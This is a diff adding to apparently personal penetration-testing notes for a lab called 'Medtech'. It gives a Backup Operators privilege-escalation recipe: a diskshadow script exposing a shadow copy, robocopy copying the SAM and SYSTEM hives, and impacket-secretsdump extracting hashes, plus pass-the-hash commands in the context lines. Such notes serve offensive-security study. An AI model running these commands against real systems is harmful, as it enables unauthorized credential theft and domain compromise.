@@ -1697,3 +1697,24 @@ smbclient //10.0.0.30/Finance -U user --pw-nt-hash BD1C6503987F8FF006296118F359F
 impacket-secretsdump ituser@<any-domain-joined-machine> -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
 
 ```
+
+**Medtech**
+1. Achieving local administrator via the Backup Operators group:
+
+	- this all should be done from C:\Temp on a domain joined machine
+ 	- https://juggernaut-sec.com/sebackupprivilege/#An_Easier_Way_to_Extract_a_Copy_of_the_Local_SAM_File_Hash_with_SeBackupPrivilege
+    	- diskshadow.txt:
+```
+set context persistent nowriters
+SET METADATA .\meta.cab
+add volume c: alias temp
+create
+expose %temp% r:
+```
+```
+diskshadow.exe /s C:\Users\joe\Desktop\diskshadow.txt
+robocopy /b R:\Windows\System32\Config C:\Temp SAM
+robocopy /b R:\Windows\System32\Config C:\Temp SYSTEM
+sudo impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+```
+
